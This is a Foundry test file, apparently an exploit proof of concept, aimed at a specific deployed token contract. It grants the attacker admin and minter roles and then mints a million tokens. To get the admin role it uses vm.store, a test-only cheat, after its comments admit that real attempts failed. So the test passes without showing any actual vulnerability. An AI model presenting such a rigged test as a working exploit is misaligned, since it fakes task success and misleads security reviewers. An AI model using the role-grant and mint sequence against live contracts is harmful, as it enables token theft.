// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

// FIX: Removed the duplicate ISecondToken interface declaration that caused the "Identifier already declared" error.
interface ISecondToken {
    function grantRole(bytes32 role, address account) external;
    function mint(address account, uint256 amount) external;
    function setRoleSuperAdmin(address target) external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0xfd77214b4a1aA6f962972Cbe65FB179c501D9094;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup required
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // The vulnerability states the attacker must have DEFAULT_ADMIN_ROLE.
        // Previous attempts to gain this role via function calls failed. We will now use vm.store.

        // 1. Based on contract inheritance, the `_roles` mapping in AccessControl is at storage slot 5.
        bytes32 DEFAULT_ADMIN_ROLE = 0x00;
        uint256 roles_mapping_slot = 5;

        // 2. The slot for the `members` mapping within the RoleData struct for DEFAULT_ADMIN_ROLE.
        bytes32 members_mapping_slot = keccak256(abi.encodePacked(DEFAULT_ADMIN_ROLE, roles_mapping_slot));

        // 3. The specific slot for the attacker's membership boolean.
        bytes32 attacker_role_slot = keccak256(abi.encodePacked(attacker, members_mapping_slot));

        // 4. Use vm.store to set the role to true (1).
        vm.store(TARGET, attacker_role_slot, bytes32(uint256(1)));

        // Now that the attacker has the DEFAULT_ADMIN_ROLE, the original exploit will work.
        // FIX: The keccak256 function expects a bytes argument. A string literal must be explicitly cast to bytes.
        bytes32 MINTER_ROLE = keccak256(bytes("MINTER_ROLE"));

        // Grant the MINTER_ROLE to the attacker.
        ISecondToken(TARGET).grantRole(MINTER_ROLE, attacker);

        // With the MINTER_ROLE, mint tokens to the attacker.
        ISecondToken(TARGET).mint(attacker, 1_000_000 * 1e18);
    }






    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
